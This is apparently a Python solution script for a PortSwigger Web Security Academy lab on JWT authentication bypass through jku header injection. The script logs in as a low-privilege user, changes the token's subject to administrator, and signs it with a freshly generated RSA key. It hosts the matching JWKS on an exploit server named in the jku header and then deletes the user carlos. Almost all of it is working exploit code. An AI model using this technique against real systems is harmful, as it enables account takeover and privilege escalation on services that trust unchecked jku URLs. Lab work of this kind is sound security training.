'''
This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

import jwt
import json
import requests
import uuid
from bs4 import BeautifulSoup
from jwcrypto import jwk


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0abd006504713a6d81851c66004f00f0.web-security-academy.net"
exploit_server = "https://exploit-0a3c00df04bf3a5581c31b4401060015.exploit-server.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# get JWT session cookie
session_cookie = s.cookies.get('session')
jwt_payload = jwt.decode(session_cookie, options={'verify_signature':False})

jwt_payload['sub'] = 'administrator'

# generate RSA key and embed public key in to JWT's jwk header
key = jwk.JWK.generate(kty='RSA', size=2048)
public_key = key.export_public(as_dict=True)
private_key = key.export_to_pem(private_key=True, password=None)

# generate kid
kid = str(uuid.uuid4())

# generate jwt header with jku parameter
jwt_headers = {
    'alg':'RS256',
    'typ':'JWT',
    'jku':f"{exploit_server}/exploit",
    'kid':kid
}

# generate encoded token with updated signature
admin_token = jwt.encode(jwt_payload, private_key, algorithm='RS256', headers=jwt_headers)
# update session_cookie to have jku param
s.cookies.set('session', admin_token)

# generate jwk for exploit-server/jwks.json
jwks = {
    'keys':[
        {
            'kty':public_key['kty'],
            'e':public_key['e'],
            'n':public_key['n'],
            'kid':kid
        }
    ]
}

# host jku key to exploit server
payload = {
    'urlIsHttps':'on',
    'responseFile':'/exploit',
    'responseHead':'HTTP/1.1 200 OK\nContent-Type: application/json',
    'responseBody':json.dumps(jwks, indent=4),
    'formAction':'STORE'
}
s.post(exploit_server, data=payload)


# delete carlos
payload = {'username':'carlos'}
s.get(f"{url}/admin/delete", params=payload)

'''
Example of updated JWT
header:
{
    "alg": "RS256",
    "jku": "https://exploit-0a3c00df04bf3a5581c31b4401060015.exploit-server.net/exploit",
    "kid": "dee2c98d-1ce6-4ad3-b2a1-58b7dd1a88d9",
    "typ": "JWT"
}

payload:
{
    "iss": "portswigger",
    "exp": 1723090369,
    "sub": "administrator"
}
'''
